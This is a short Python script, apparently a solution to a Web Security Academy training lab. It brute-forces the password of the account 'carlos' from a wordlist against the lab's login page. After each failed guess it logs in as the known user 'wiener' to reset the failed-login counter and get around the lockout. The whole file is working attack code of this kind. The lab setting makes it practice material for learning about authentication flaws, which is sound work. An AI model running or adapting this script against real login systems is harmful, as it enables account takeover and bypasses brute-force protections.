import requests
from bs4 import BeautifulSoup

s = requests.Session()

custom_id = 'ac791fe71eb35a51c0c8ab15001f0051'
site = f'{custom_id}.web-security-academy.net'
login_url = f'''https://{site}/login'''


def login_wiener():
    logindata = {
        'username': 'wiener',
        'password': 'peter'
    }
    s.post(login_url, data=logindata)


if __name__ == '__main__':
    atkTarget = "carlos"

    passwords = open("candidate-lab-passwords", "r").readlines()
    for password in passwords:
        pw = password.strip()
        loginData = {
            'username': atkTarget,
            'password': pw
        }
        resp = s.post(login_url, data=loginData)
        soup = BeautifulSoup(resp.text, 'html.parser')
        if 'Incorrect password' not in resp.text:
            s.get(f'https://{site}/my-account?id={atkTarget}')
            print("Password: ", pw)
        else:
            login_wiener()
